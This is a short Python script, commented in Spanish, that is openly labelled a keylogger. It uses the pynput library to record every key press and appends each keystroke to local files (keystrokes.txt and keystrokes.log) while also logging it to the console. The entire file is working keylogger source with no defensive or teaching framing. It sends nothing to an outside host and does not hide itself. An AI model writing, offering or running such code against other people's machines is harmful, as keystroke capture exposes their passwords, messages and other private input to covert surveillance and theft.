import logging
import pynput
from pynput.keyboard import Key, Listener

# Configuración del logger
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

# Manejador para guardar en archivo
log_file = 'keystrokes.log'
fh = logging.FileHandler(log_file)
fh.setLevel(logging.INFO)

# Manejador para mostrar en consola
ch = logging.StreamHandler()
ch.setLevel(logging.INFO)

# Formato del logger
formatter = logging.Formatter('%(asctime)s %(levelname)s %(message)s')
fh.setFormatter(formatter)
ch.setFormatter(formatter)

# Agregar manejadores al logger
logger.addHandler(fh)
logger.addHandler(ch)

def start_keylogger():
    # Función para manejar la presión de teclas
    def on_press(key):
        try:
            # Registrar la tecla presionada en el archivo de log
            with open('keystrokes.txt', 'a') as f:
                f.write(f'{key}\n')

            # Mostrar la tecla presionada en el logger
            logger.info(f'Keystroke detected: {key}')
        except Exception as e:
            logger.exception(f'Error: {e}')

    try:
        # Crear un listener para el teclado
        with Listener(on_press=on_press) as listener:
            logger.info('Keylogger started.')
            listener.join()  # Mantener el listener activo
    except Exception as e:
        logger.exception(f'Error: {e}')

if __name__ == '__main__':
    try:
        # Iniciar el keylogger en segundo plano
        start_keylogger()
    except KeyboardInterrupt:
        # Detener el keylogger si se presiona Ctrl+C
        logger.info('Keylogger stopped by user')
    except Exception as e:
        logger.exception(f'Error: {e}')
